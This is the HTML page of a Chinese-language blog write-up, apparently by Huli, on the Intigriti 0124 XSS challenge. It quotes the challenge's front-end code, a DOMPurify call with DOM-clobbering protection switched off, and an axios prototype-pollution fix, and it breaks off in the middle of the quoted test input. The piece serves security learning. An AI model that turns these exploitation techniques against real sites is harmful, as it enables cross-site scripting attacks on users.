@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>Intigriti 0124 XSS 筆記 - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2024/02/17/en/intigriti-0124-writeup/" rel="alternate" hreflang="en" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2024/02/17/intigriti-0124-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="上個月（2024 年 1 月）的 Intigriti 挑戰非常有趣，出題者是 @kevin_mizu，之前也常在推特上看到他出一些 client-side 相關的題目，而這次的題目品質也一如既往的很好，值得寫一篇紀錄。 題目的連結在這邊，沒有看過的話可以先去看看：https:&#x2F;&#x2F;challenge-0124.intigriti.io&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intigriti 0124 XSS 筆記">
+<meta property="og:url" content="https://blog.huli.tw/2024/02/17/intigriti-0124-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="上個月（2024 年 1 月）的 Intigriti 挑戰非常有趣，出題者是 @kevin_mizu，之前也常在推特上看到他出一些 client-side 相關的題目，而這次的題目品質也一如既往的很好，值得寫一篇紀錄。 題目的連結在這邊，沒有看過的話可以先去看看：https:&#x2F;&#x2F;challenge-0124.intigriti.io&#x2F;">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.huli.tw/img/intigriti-0124-writeup/cover.png">
+<meta property="article:published_time" content="2024-02-17T04:40:00.000Z">
+<meta property="article:modified_time" content="2024-02-17T10:53:39.068Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/intigriti-0124-writeup/cover.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Intigriti 0124 XSS 筆記" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=4.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#似乎比想像中簡單">1&nbsp;&nbsp;<b>似乎比想像中簡單？</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#預期解法也沒這麼難嗎">2&nbsp;&nbsp;<b>預期解法也沒這麼難…嗎？</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#人生三大錯覺之一我能解開">3&nbsp;&nbsp;<b>人生三大錯覺之一：我能解開</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#還是得靠提示">4&nbsp;&nbsp;<b>還是得靠提示</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#後記">5&nbsp;&nbsp;<b>後記</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2024/02/17/en/intigriti-0124-writeup/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Intigriti 0124 XSS 筆記
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2024-02-17T04:40:00.000Z" itemprop="datePublished">2024年2月17日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>上個月（2024 年 1 月）的 Intigriti 挑戰非常有趣，出題者是 <a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu">@kevin_mizu</a>，之前也常在推特上看到他出一些 client-side 相關的題目，而這次的題目品質也一如既往的很好，值得寫一篇紀錄。</p>
+<p>題目的連結在這邊，沒有看過的話可以先去看看：<a target="_blank" rel="noopener" href="https://challenge-0124.intigriti.io/">https://challenge-0124.intigriti.io/</a></p>
+<span id="more"></span>
+
+<h2><span id="似乎比想像中簡單">似乎比想像中簡單？</span></h2><p>題目的程式碼滿簡短的，先來看前端的部分，基本上就是一個 HTML 而已：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Intigriti XSS Challenge<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/main.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Hey &lt;%- name %>,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Which repo are you looking for?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%= search %><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/img/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loading<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50px<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>35%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>homepage<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/axios.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/jquery-3.7.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>
+                    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中這一段 <code>&lt;h2&gt;Hey &lt;%- name %&gt;</code> 是與後端唯一有關的部分，會在後端使用 DOMPurify 來進行 sanitization：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">name</span><span class="token operator">:</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token constant">SANITIZE_DOM</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">search</span><span class="token operator">:</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>search
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>值得注意的是這邊的 <code>SANITIZE_DOM: false</code>，這個設置會停止對於 DOM Clobbering 的防護，因此可以猜測這題與 DOM Clobbering 有關，才會刻意把這個設置關掉。</p>
+<p>而整題最主要的邏輯都在 search 函式裡面了：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>
+                <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其實上面這一段，並沒有看出什麼有漏洞的地方，因此看完這段之後，我就先往用到的 library 去找，這題用到的是 jQuery 3.7.1 以及 axios 1.6.2，雖然檔案名稱沒寫，但是從檔案內容可以看得出來。</p>
+<p>查了一下可以發現 1.6.2 並非最新版本，而且在 1.6.4 中修復了一個 prototype pollution 的漏洞：<a target="_blank" rel="noopener" href="https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e">https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e</a></p>
+<p>commit 裡面更是直接附上了 exploit，非常貼心：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">it</span><span class="token punctuation">(</span><span class="token string">'should resist prototype pollution CVE'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[0]'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[1]'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
